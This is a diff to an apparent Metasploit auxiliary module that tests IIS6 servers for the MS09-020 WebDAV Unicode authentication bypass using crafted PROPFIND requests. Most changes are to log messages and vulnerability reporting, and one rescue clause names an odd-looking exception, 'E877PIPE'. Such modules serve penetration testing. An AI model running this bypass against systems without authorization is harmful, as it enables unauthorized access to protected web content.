@@ -22,13 +22,12 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'   		=> 'MS09-020 IIS6 WebDAV Unicode Auth Bypass',
+			'Name'   		=> 'MS09-020 IIS6 WebDAV Unicode Authentication Bypass',
 			'Description'	=> %q{
-				Simplified version of MS09-020 IIS6 WebDAV Unicode Auth Bypass scanner. It attempts
-				to bypass authentication using the WebDAV IIS6 Unicode vulnerability
-				discovered by Kingcope. The vulnerability appears to be exploitable
-				where WebDAV is enabled on the IIS6 server, and any protected folder
-				requires either Basic, Digest or NTLM authentication.
+				This module attempts to to bypass authentication using the WebDAV IIS6 
+				Unicode vulnerability discovered by Kingcope. The vulnerability appears
+				to be exploitable where WebDAV is enabled on the IIS6 server, and any 
+				protected folder requires either Basic, Digest or NTLM authentication.
 			},
 			'Author' 		=> [ 'et', 'patrick' ],
 			'Version'		=> '$Revision$',
@@ -77,8 +76,8 @@ class Metasploit3 < Msf::Auxiliary
 			if(not res)
 				print_error("NO Response.")
 			elsif (res.code.to_i == 401)
-				print_status("Confirmed protected folder #{wmap_base_url}#{tpath} #{res.code} (#{wmap_target_host})")
-				print_status("\tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.")
+				print_status("#{rhost}:#{rport} Confirmed protected folder #{wmap_base_url}#{tpath} #{res.code} (#{wmap_target_host})")
+				print_status("#{rhost}:#{rport} \tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.")
 
 				cset  = %W{ & ^ % $ # @ ! }
 				buff  = ''
@@ -100,7 +99,7 @@ class Metasploit3 < Msf::Auxiliary
 				}, 20)
 
 				if (res.code.to_i == 207)
-					print_status("\tFound vulnerable WebDAV Unicode bypass.  #{wmap_base_url}#{tpath}#{bogus}/ #{res.code} (#{wmap_target_host})")
+					print_status("#{rhost}:#{rport} \tFound vulnerable WebDAV Unicode bypass.  #{wmap_base_url}#{tpath}#{bogus}/ #{res.code} (#{wmap_target_host})")
 
 
 					report_vuln(
@@ -108,8 +107,9 @@ class Metasploit3 < Msf::Auxiliary
 							:host	=> ip,
 							:port	=> rport,
 							:proto	=> 'tcp',
-							:name	=> self.fullname,
-							:info	=> "#{tpath}#{bogus} / Code: #{res.code}",
+							:sname  => ssl ? 'https' : 'http',
+							:name	=> self.name,
+							:info	=> "Module #{self.fullname} bypassed authentication with #{tpath}#{bogus} (response code #{res.code})",
 							:refs   => self.references,
 							:exploited_at => Time.now.utc
 						}
@@ -117,7 +117,7 @@ class Metasploit3 < Msf::Auxiliary
 
 				end
 			else
-				print_error("Folder does not require authentication. [#{res.code}]")
+				print_error("#{rhost}:#{rport} Folder does not require authentication. [#{res.code}]")
 			end
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
 		rescue ::Timeout::Error, ::Errno::E877PIPE
